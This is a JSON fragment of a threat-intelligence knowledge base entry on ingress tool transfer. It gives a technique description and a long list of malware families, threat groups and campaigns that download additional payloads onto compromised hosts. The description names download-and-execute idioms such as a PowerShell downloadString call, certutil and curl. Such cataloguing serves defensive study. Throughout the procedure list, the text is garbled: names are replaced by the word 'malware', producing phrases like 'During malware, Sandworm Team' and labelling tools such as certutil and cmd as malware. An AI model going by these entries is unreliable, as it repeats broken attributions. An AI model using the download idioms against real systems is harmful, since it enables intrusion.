        "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). On Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.[1]Adversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).[2]Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system.[3] In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.[4]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. [5]"
            },
            "S0469": {
                "ID": "S0469",
                "Name": "ABK",
                "Description": "malware has the ability to download files from C2.[6]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware has the ability to download additional payloads onto an infected machine.[7]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can download additional files for execution on the victim\u2019s machine.[8][9]"
            },
            "S0092": {
                "ID": "S0092",
                "Name": "Agent.btz",
                "Description": "malware attempts to download an encrypted binary from a specified domain.[10]"
            },
            "G0130": {
                "ID": "G0130",
                "Name": "Ajax Security Team",
                "Description": "malware has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.[11]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware can download and execute files to further infect a host machine with additional malware.[12]"
            },
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware can download additional payloads.[13][14]"
            },
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has downloaded additional tools and malware onto compromised hosts.[15]"
            },
            "S1074": {
                "ID": "S1074",
                "Name": "ANDROMEDA",
                "Description": "malware can download additional payloads from C2.[16]"
            },
            "G0099": {
                "ID": "G0099",
                "Name": "APT-C-36",
                "Description": "malware has downloaded binary data from a specified domain after the malicious document is opened.[17]"
            },
            "G0026": {
                "ID": "G0026",
                "Name": "APT18",
                "Description": "malware can upload a file to the victim\u2019s machine.[18]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[19][20][21][22][23]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has downloaded additional tools and malware onto compromised networks.[24][25][26][27]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can copy files to remote machines.[28]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.[29]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has downloaded additional files and programs from its C2 server.[30][31]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has downloaded second stage malware from compromised websites.[32][33][34][35]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim\u2019s machine.[36]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has downloaded tools to compromised hosts.[37][38]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used certutil to download additional files.[39][40][41] malware downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access.[42]"
            },
            "G0143": {
                "ID": "G0143",
                "Name": "Aquatic Panda",
                "Description": "malware has downloaded additional malware onto compromised hosts.[43]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to download additional payloads from C2.[44]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses certutil and BITSAdmin to download additional malware. [45][46][47]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware has the ability to download files over SFTP.[48]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware can download additional plugins, updates and other files. [49]"
            },
            "S0347": {
                "ID": "S0347",
                "Name": "AuditCred",
                "Description": "malware can download files and additional malware.[50]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to download files from C2 to a compromised host.[6]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can download and execute additional files. malware has also downloaded a ransomware payload called Hermes.[51][52]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has downloaded additional files from the C2.[53][54]"
            },
            "S0475": {
                "ID": "S0475",
                "Name": "BackConfig",
                "Description": "malware can download and execute additional payloads on a compromised host.[55]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware can download additional modules from C2.[56]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has downloaded additional files and tools onto a compromised host.[57]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware has download files from its C2 server.[58]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware has the ability to load a second stage malicious DLL file onto a compromised machine.[59]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware is capable of downloading additional files through C2 channels, including a new version of itself.[60][61][62]"
            },
            "S0337": {
                "ID": "S0337",
                "Name": "BadPatch",
                "Description": "malware can download and execute or update malware.[63]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can download files to the system.[64]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware uploads files and secondary payloads to the victim's machine.[65]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.[66][67][68][69]"
            },
            "S0470": {
                "ID": "S0470",
                "Name": "BBK",
                "Description": "malware has the ability to download files from C2 to the infected host.[6]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware is designed to download an implant from a C2 server.[70]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to download a file from the C2 server.[71]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has the capability to download files to execute on the victim\u2019s machine.[72][73][74]"
            },
            "S0190": {
                "ID": "S0190",
                "Name": "BITSAdmin",
                "Description": "malware can be used to create BITS Jobs to upload and/or download files.[75]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has downloaded additional malware and tools onto a compromised host.[76][77]"
            },
            "S0564": {
                "ID": "S0564",
                "Name": "BlackMould",
                "Description": "malware has the ability to download files to the victim's machine.[78]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has downloaded files to a victim machine.[79]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can download additional files onto the host.[34]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware can download additional modules from the C2 server.[80]"
            },
            "S0360": {
                "ID": "S0360",
                "Name": "BONDUPDATER",
                "Description": "malware can download or upload files from its C2 server.[81]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware has the ability to download next stage malware components to a compromised system.[82]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware can download files.[83]"
            },
            "S0204": {
                "ID": "S0204",
                "Name": "Briba",
                "Description": "malware downloads files onto infected hosts.[84]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has used various tools to download files, including DGet (a similar tool to wget).[85]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can download files to compromised hosts.[86]"
            },
            "S0471": {
                "ID": "S0471",
                "Name": "build_downer",
                "Description": "malware has the ability to download files from C2 to the infected host.[6]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can download and execute additional payloads including through the use of a Dex command.[87][88][89]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware can download and execute new versions of itself.[90]"
            },
            "S1118": {
                "ID": "S1118",
                "Name": "BUSHWALK",
                "Description": "malware can write malicious payloads sent through a web request\u2019s command parameter.[91][92]"
            },
            "C0010": {
                "ID": "C0010",
                "Name": "C0010",
                "Description": "During malware, UNC3890 actors downloaded tools and malware onto a compromised host.[93]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors downloaded additional tools and files onto a compromised network.[94]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 downloaded malicious payloads onto compromised systems.[95]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network.[96][97]"
            },
            "C0021": {
                "ID": "C0021",
                "Name": "C0021",
                "Description": "During malware, the threat actors downloaded additional tools and files onto victim machines.[98][99]"
            },
            "C0026": {
                "ID": "C0026",
                "Name": "C0026",
                "Description": "During malware, the threat actors downloaded malicious payloads onto select compromised hosts.[16]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider downloaded tools using victim organization systems.[100]"
            },
            "S0274": {
                "ID": "S0274",
                "Name": "Calisto",
                "Description": "malware has the capability to upload and download files to the victim's machine.[101]"
            },
            "S0077": {
                "ID": "S0077",
                "Name": "CallMe",
                "Description": "malware has the capability to download a file to the victim from the C2 server.[102]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can download a payload for execution.[103]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware can download and execute new plugins from the C2 server. [104][105]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can download and execute additional payloads.[106]"
            },
            "S0465": {
                "ID": "S0465",
                "Name": "CARROTBALL",
                "Description": "malware has the ability to download and install a remote payload.[107]"
            },
            "S0462": {
                "ID": "S0462",
                "Name": "CARROTBAT",
                "Description": "malware has the ability to download and execute a remote file via certutil.[108]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to download and upload files to the system.[109]"
            },
            "S0160": {
                "ID": "S0160",
                "Name": "certutil",
                "Description": "malware can be used to download files from a given URL.[110][111]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware can download additional files onto an infected machine.[112]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware has the ability to download additional modules to a compromised host.[113]"
            },
            "S0144": {
                "ID": "S0144",
                "Name": "ChChes",
                "Description": "malware is capable of downloading files, including additional modules.[114][115][116]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has remotely copied tools and malware onto targeted systems.[117]"
            },
            "S0020": {
                "ID": "S0020",
                "Name": "China Chopper",
                "Description": "malware's server component can download remote files.[118][119][120][121][122]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware is capable of performing remote file transmission.[123]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can download its code from C2.[124]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has downloaded files, including Cobalt Strike, to compromised hosts.[125]"
            },
            "S0054": {
                "ID": "S0054",
                "Name": "CloudDuke",
                "Description": "malware downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.[26]"
            },
            "S0106": {
                "ID": "S0106",
                "Name": "cmd",
                "Description": "malware can be used to copy files to/from a remotely connected external system.[126]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[127][3] The group's JavaScript backdoor is also capable of downloading files.[128]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can deliver additional payloads to victim machines.[129][130]"
            },
            "S0369": {
                "ID": "S0369",
                "Name": "CoinTicker",
                "Description": "malware executes a Python script to download its second stage.[131]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware downloads an HTTP server to the infected machine.[132]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has downloaded additional files and payloads onto a compromised host following initial access.[133][134]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware can download additional scripts from a web server.[135]"
            },
            "S0137": {
                "ID": "S0137",
                "Name": "CORESHELL",
                "Description": "malware downloads another dropper from its C2 server.[136]"
            },
            "S0614": {
                "ID": "S0614",
                "Name": "CostaBricks",
                "Description": "malware has been used to load SombRAT onto a compromised host.[137]"
            },
            "C0004": {
                "ID": "C0004",
                "Name": "CostaRicto",
                "Description": "During malware, the threat actors downloaded malware and tools onto a compromised host.[137]"
            },
            "S1023": {
                "ID": "S1023",
                "Name": "CreepyDrive",
                "Description": "malware can download files to the compromised host.[138]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a command to retrieve files from its C2 server.[139][140][141]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware has the ability to send and receive files.[142]"
            },
            "S0527": {
                "ID": "S0527",
                "Name": "CSPY Downloader",
                "Description": "malware can download additional tools to a compromised host.[143]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can download files from its C2 server.[144]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.[145]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware has the ability to download files to target systems.[146][147]"
            },
            "S0497": {
                "ID": "S0497",
                "Name": "Dacls",
                "Description": "malware can download its payload from a C2 server.[142][148]"
            },
            "S1014": {
                "ID": "S1014",
                "Name": "DanBot",
                "Description": "malware can download additional files to a targeted system.[149]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can load any files onto the infected machine to execute.[150][151]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server.[152] malware uses Windows Batch scripts executing the curl command to retrieve follow-on payloads.[153]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has used first-stage payloads that download additional malware from C2 servers.[154]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such as Agent Tesla, AsyncRat, NanoCore, RedLine, Cobalt Strike, and Metasploit.[155]"
            },
            "S0187": {
                "ID": "S0187",
                "Name": "Daserf",
                "Description": "malware can download remote files.[156][85]"
            },
            "S0255": {
                "ID": "S0255",
                "Name": "DDKONG",
                "Description": "malware downloads and uploads files on the victim\u2019s machine.[157]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware can download files to a compromised host.[158]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware deploys additional backdoors and hacking tools to the system.[159]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can receive configuration updates and additional payloads including wscpy.exe from C2.[160]"
            },
            "S0200": {
                "ID": "S0200",
                "Name": "Dipsind",
                "Description": "malware can download remote files.[161]"
            },
            "S1088": {
                "ID": "S1088",
                "Name": "Disco",
                "Description": "malware can download files to targeted systems via SMB.[162]"
            },
            "S1021": {
                "ID": "S1021",
                "Name": "DnsSystem",
                "Description": "malware can download files to compromised systems after receiving a command with the string downloaddd.[163]"
            },
            "S0213": {
                "ID": "S0213",
                "Name": "DOGCALL",
                "Description": "malware can download and execute additional payloads.[164]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has downloaded scripts from C2.[165]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware can download and execute previously staged shellcode payloads.[166]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to download files to the compromised host.[6]"
            },
            "S0134": {
                "ID": "S0134",
                "Name": "Downdelph",
                "Description": "After downloading its main config file, malware downloads multiple payloads from C2 servers.[167]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has copied and installed tools for operations once in the victim environment.[168]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can deploy additional tools onto an infected machine.[169]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware can download and execute additional files.[170][171]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware can download files to a compromised host.[172]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware\u2019s can download and upload a file to the victim\u2019s computer.[173][174]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has a command to download and executes additional files.[175]"
            },
            "S0624": {
                "ID": "S0624",
                "Name": "Ecipekac",
                "Description": "malware can download additional payloads to a compromised host.[176]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has the ability to download files from its C2 server.[177][178]"
            },
            "G0066": {
                "ID": "G0066",
                "Name": "Elderwood",
                "Description": "The Ritsol backdoor trojan used by malware can download files onto a compromised host from a remote location.[179]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "malware can download additional files from the C2 server for execution.[180]"
            },
            "G1003": {
                "ID": "G1003",
                "Name": "Ember Bear",
                "Description": "malware has used tools to download malicious code.[181]"
            },
            "S0082": {
                "ID": "S0082",
                "Name": "Emissary",
                "Description": "malware has the capability to download files from the C2 server.[182]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can upload and download to and from a victim machine.[183]"
            },
            "S0404": {
                "ID": "S0404",
                "Name": "esentutl",
                "Description": "malware can be used to copy files from a given URL.[184]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has downloaded additional Lua scripts from the C2.[185]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can download and upload files to the victim's computer.[186][187]"
            },
            "G0120": {
                "ID": "G0120",
                "Name": "Evilnum",
                "Description": "malware can deploy additional components or tools as needed.[186]"
            },
            "S0401": {
                "ID": "S0401",
                "Name": "Exaramel for Linux",
                "Description": "malware has a command to download a file from  and to a remote C2 server.[188][189]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has a function to download a file to the infected system.[190]"
            },
            "S0171": {
                "ID": "S0171",
                "Name": "Felismus",
                "Description": "malware can download files from remote servers.[191]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware downloads and uploads files to and from the victim\u2019s machine.[192][193]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has downloaded additional tools and malware to compromised systems.[194][195]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.[196][197][198]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has used remote code execution to download subsequent payloads.[199][200]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can download additional malware from the C2 server.[201]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware can transfer files from C2.[202]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.[203]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has downloaded additional tools including PsExec directly to endpoints.[204]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors downloaded files and tools onto a victim machine.[205]"
            },
            "S0095": {
                "ID": "S0095",
                "Name": "ftp",
                "Description": "malware may be abused by adversaries to transfer tools or files from an external system into a compromised environment.[206][207]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can download additional files onto a compromised host.[208]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors downloaded additional droppers and backdoors onto a compromised system.[208]"
            },
            "S0628": {
                "ID": "S0628",
                "Name": "FYAnti",
                "Description": "malware can download additional payloads to a compromised host.[176]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.[209][78]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has downloaded additional malware and tools onto a compromised host.[210][211][212][213]"
            },
            "S0168": {
                "ID": "S0168",
                "Name": "Gazer",
                "Description": "malware can execute a task to download a file.[214][215]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can download additional plug-ins to a compromised host.[124]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware can download files to the victim\u2019s machine.[216][217]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware can download additional components from the C2 server.[218]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware constantly attempts to download and execute files from the remote C2, including malware itself if not found on the system.[219]"
            },
            "S0588": {
                "ID": "S0588",
                "Name": "GoldMax",
                "Description": "malware can download and execute additional files.[220][221]"
            },
            "G0078": {
                "ID": "G0078",
                "Name": "Gorgon Group",
                "Description": "malware malware can download additional files from C2 servers.[222]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can download its second stage from a hardcoded URL within the loader's code.[223][224]"
            },
            "S0342": {
                "ID": "S0342",
                "Name": "GreyEnergy",
                "Description": "malware can download additional modules and payloads.[193]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware has the ability to download and execute additional payloads.[225]"
            },
            "S0561": {
                "ID": "S0561",
                "Name": "GuLoader",
                "Description": "malware can download further malware for execution on the victim's machine.[226]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.[227]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.[228][121]"
            },
            "S0499": {
                "ID": "S0499",
                "Name": "Hancitor",
                "Description": "malware has the ability to download additional files from C2.[229]"
            },
            "S0214": {
                "ID": "S0214",
                "Name": "HAPPYWORK",
                "Description": "can download and execute a second-stage payload.[32]"
            },
            "S0170": {
                "ID": "S0170",
                "Name": "Helminth",
                "Description": "malware can download additional files.[230]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has downloaded additional payloads and malicious scripts onto a compromised host.[231]"
            },
            "S0087": {
                "ID": "S0087",
                "Name": "Hi-Zor",
                "Description": "malware has the ability to upload and download files from its C2 server.[232]"
            },
            "S0394": {
                "ID": "S0394",
                "Name": "HiddenWasp",
                "Description": "malware downloads a tar compressed archive from a download server to the system.[233]"
            },
            "S0009": {
                "ID": "S0009",
                "Name": "Hikit",
                "Description": "malware has the ability to download files to a compromised host.[234]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has downloaded additional scripts that build and run Monero cryptocurrency miners.[235]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has the ability to connect to a remote host in order to upload and download files.[236]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to upload a file from the command and control (C2) server to the victim machine.[237]"
            },
            "S0070": {
                "ID": "S0070",
                "Name": "HTTPBrowser",
                "Description": "malware is capable of writing a file to the compromised system from the C2 server.[238]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can download files and additional malware components.[239][240]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware has the ability to download additional files.[241]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has the ability to download additional modules and a configuration file from C2.[242][243]"
            },
            "G0136": {
                "ID": "G0136",
                "Name": "IndigoZebra",
                "Description": "malware has downloaded additional files and tools from its C2 server.[83]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has downloaded additional scripts, malware, and tools onto a compromised host.[244][245]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware downloads a shellcode payload from a remote C2 server and loads it into memory.[246]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can upload files to the victim's machine for operations.[247][248]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware can download and execute additional files.[249]"
            },
            "S0528": {
                "ID": "S0528",
                "Name": "Javali",
                "Description": "malware can download payloads from remote C2 servers.[47]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware can retrieve an additional payload from its C2 server.[250][251] malware has a command to download files to the victim\u2019s machine.[252]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can download files and upgrade itself.[161]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can download and execute files.[253][254][255]"
            },
            "S0648": {
                "ID": "S0648",
                "Name": "JSS Loader",
                "Description": "malware has the ability to download malicious executables to a compromised host.[256]"
            },
            "S0215": {
                "ID": "S0215",
                "Name": "KARAE",
                "Description": "malware can upload and download files, including second-stage malware.[32]"
            },
            "S0088": {
                "ID": "S0088",
                "Name": "Kasidet",
                "Description": "malware has the ability to download and execute additional files.[257]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware downloads additional plug-ins to load on the victim\u2019s machine, including the ability to upgrade and replace its own binary.[258]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has used tools to download files to compromised machines.[259]"
            },
            "S0585": {
                "ID": "S0585",
                "Name": "Kerrdown",
                "Description": "malware can download specific payloads to a compromised host based on OS architecture.[260]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware can download additional modules from the C2 server.[80]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can download files to the compromised host.[231]"
            },
            "S0387": {
                "ID": "S0387",
                "Name": "KeyBoy",
                "Description": "malware has a download and upload functionality.[261][262]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware can upload files to the victim\u2019s machine and can download additional payloads.[263]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware has the ability to download and execute code from remote servers.[143]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has downloaded additional scripts, tools, and malware onto victim systems.[40][264]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has downloaded additional lateral movement scripts from C2.[265]"
            },
            "S0437": {
                "ID": "S0437",
                "Name": "Kivars",
                "Description": "malware has the ability to download and execute files.[266]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can download additional files and tools.[267][268]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware has executed a PowerShell command to download a file to the system.[268]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware can download files and execute them on the victim\u2019s machine.[269][270]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware downloads additional files from C2 servers.[271]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has downloaded files, malware, and tools from its C2 onto a compromised host.[272][273][274][142][148][275][276][277][278][279]"
            },
            "G0140": {
                "ID": "G0140",
                "Name": "LazyScripter",
